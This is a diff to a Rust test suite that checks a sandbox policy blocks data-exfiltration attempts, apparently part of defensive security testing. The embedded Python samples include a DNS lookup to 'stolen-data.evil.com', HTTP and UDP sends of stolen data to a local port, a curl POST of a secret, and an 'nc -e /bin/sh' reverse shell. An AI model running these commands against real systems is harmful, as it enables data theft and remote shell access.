@@ -155,7 +155,7 @@ fn test_air_gap_exfiltration_attempts() {
     // Encode stolen data as DNS subdomain labels. Caught by network phase
     // on getaddrinfo (deny: ["*"] matches all destinations).
     skip_if_no_python_primary!(python => {
-        let py_code = "import socket,time\ntry:\n socket.getaddrinfo('stolen-data.evil.com',80)\nexcept: pass\ntime.sleep(1)";
+        let py_code = format!("import socket\ntry:\n socket.getaddrinfo('stolen-data.evil.com',80)\nexcept: pass{PY_FLUSH}");
         let output = cmd(&format!("x -p {} -- {} -c {}", POLICY, python.display(), sq(py_code)))
             .timeout(secs(10)).run();
         let stdout = output.stdout();
@@ -170,7 +170,7 @@ fn test_air_gap_exfiltration_attempts() {
     // Classic data exfil via HTTP POST. Caught by network phase on
     // connect (urllib uses libc sockets underneath).
     skip_if_no_python_primary!(python => {
-        let py_code = "import urllib.request,time\ntry:\n urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:4444',data=b'stolen',method='POST'),timeout=1)\nexcept: pass\ntime.sleep(1)";
+        let py_code = format!("import urllib.request\ntry:\n urllib.request.urlopen(urllib.request.Request('http://127.0.0.1:4444',data=b'stolen',method='POST'),timeout=1)\nexcept: pass{PY_FLUSH}");
         let output = cmd(&format!("x -p {} -- {} -c {}", POLICY, python.display(), sq(py_code)))
             .timeout(secs(10)).run();
         let stdout = output.stdout();
@@ -186,7 +186,7 @@ fn test_air_gap_exfiltration_attempts() {
     // socket() is deferred (no destination info), but sendto() is blocked
     // by the network phase (deny: ["*"] matches all destinations).
     skip_if_no_python_primary!(python => {
-        let py_code = "import socket,time\ntry:\n s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)\n s.sendto(b'exfil',('127.0.0.1',4444))\nexcept: pass\ntime.sleep(1)";
+        let py_code = format!("import socket\ntry:\n s=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)\n s.sendto(b'exfil',('127.0.0.1',4444))\nexcept: pass{PY_FLUSH}");
         let output = cmd(&format!("x -p {} -- {} -c {}", POLICY, python.display(), sq(py_code)))
             .timeout(secs(10)).run();
         let stdout = output.stdout();
@@ -240,7 +240,7 @@ fn test_air_gap_exfiltration_attempts() {
     // ── Exfil 6: Python os.system reverse shell ──────────────────────
     // Spawn a reverse shell via os.system. Caught by command deny on nc.
     skip_if_no_python_primary!(python => {
-        let py_code = "import os,time\nos.system('nc -e /bin/sh 127.0.0.1 4444 2>/dev/null || true')\ntime.sleep(1)";
+        let py_code = format!("import os\nos.system('nc -e /bin/sh 127.0.0.1 4444 2>/dev/null || true'){PY_FLUSH}");
         let output = cmd(&format!("x -p {} -- {} -c {}", POLICY, python.display(), sq(py_code)))
             .timeout(secs(10)).run();
         let stdout = output.stdout();
@@ -255,7 +255,7 @@ fn test_air_gap_exfiltration_attempts() {
     // Use os.system to curl POST stolen data. Caught by command deny.
     // (os.system uses /bin/sh -c → execve, reliably hooked.)
     skip_if_no_python_primary!(python => {
-        let py_code = "import os,time\nos.system('curl -s -X POST -d secret=value http://127.0.0.1:4444 2>/dev/null || true')\ntime.sleep(1)";
+        let py_code = format!("import os\nos.system('curl -s -X POST -d secret=value http://127.0.0.1:4444 2>/dev/null || true'){PY_FLUSH}");
         let output = cmd(&format!("x -p {} -- {} -c {}", POLICY, python.display(), sq(py_code)))
             .timeout(secs(10)).run();
         let stdout = output.stdout();
